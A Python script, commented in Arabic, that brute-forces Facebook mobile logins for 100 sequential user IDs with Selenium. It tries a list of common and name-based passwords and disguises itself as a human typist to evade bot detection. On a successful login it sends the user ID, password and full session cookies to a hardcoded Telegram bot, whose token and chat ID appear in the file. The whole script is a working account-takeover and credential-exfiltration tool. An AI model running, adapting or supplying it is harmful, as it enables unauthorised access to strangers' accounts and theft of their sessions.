import time
import random
import requests
from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.common.by import By
from webdriver_manager.chrome import ChromeDriverManager
from concurrent.futures import ThreadPoolExecutor

# 🔑 إعدادات تليجرام
TOKEN = "8295326912:AAHvVkEnCcryYxnovkD8yQawhBizJA_QE6w"
CHAT_ID = "5653032481"

# 📋 قائمة كلمات المرور المحتملة
PASS_LIST = [
    '123456', '12345678', '123456789', 'jasser123', 'malo123', 'jasser2004', 'jasser2005',
    'password', '123123', '112233', '445566', '778899', '000000', '111111', '12345',
    'facebook', 'love123', 'king123', '20042004', '20052005'
] + [f'jasser{i}' for i in range(2000, 2010)]

def send_to_tg(text):
    try:
        requests.post(f"https://api.telegram.org/bot{TOKEN}/sendMessage", json={'chat_id': CHAT_ID, 'text': text})
    except: pass

def check_account(uid):
    """استخدام سيلينيوم لفحص الحساب"""
    options = Options()
    options.add_argument('--headless') # العمل في الخلفية
    options.add_argument('--no-sandbox')
    options.add_argument('--disable-dev-shm-usage')
    options.add_argument('--disable-blink-features=AutomationControlled')
    options.add_argument(f'user-agent=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{random.randint(110, 120)}.0.0.0 Safari/537.36')
    
    driver = webdriver.Chrome(service=Service(ChromeDriverManager().install()), options=options)
    
    try:
        for pas in PASS_LIST:
            driver.get("https://m.facebook.com/login.php")
            time.sleep(random.uniform(2, 4))
            
            # إدخال البيانات
            driver.find_element(By.ID, "m_login_email").send_keys(uid)
            pass_input = driver.find_element(By.NAME, "pass")
            
            # محاكاة الكتابة البشرية حرف بحرف
            for char in pas:
                pass_input.send_keys(char)
                time.sleep(0.1)
                
            driver.find_element(By.NAME, "login").click()
            time.sleep(5)
            
            current_url = driver.current_url
            
            if "c_user" in driver.get_cookies() or "home.php" in current_url:
                cookies = "; ".join([f"{c['name']}={c['value']}" for c in driver.get_cookies()])
                send_to_tg(f"✅ تم الاختراق (Selenium)\n🆔 ID: {uid}\n🔑 PASS: {pas}\n🍪 COOKIE: {cookies}")
                break
            elif "checkpoint" in current_url:
                send_to_tg(f"⚠️ نقطة تفتيش (CP)\n🆔 ID: {uid}\n🔑 PASS: {pas}")
                break
            
            driver.delete_all_cookies() # تنظيف الجلسة لتجربة كلمة مرور أخرى
            
    except Exception as e:
        print(f"Error checking {uid}: {e}")
    finally:
        driver.quit()

def run_main():
    start_id = 26701173
    send_to_tg(f"🚦 بدأ التفعيل (محرك Selenium)...\n🔹 البداية من: {start_id}\n🔹 الوضع: تخفي بشري 🕵️")
    
    ids = [str(start_id + i) for i in range(100)] # جرب 100 حساب في الدفعة الواحدة
    
    # سيلينيوم يستهلك رام عالية، لذا سنستخدم عدد خيوط أقل لضمان الاستقرار (مثلاً 5 في وقت واحد)
    with ThreadPoolExecutor(max_workers=5) as pool:
        pool.map(check_account, ids)

if __name__ == "__main__":
    run_main()
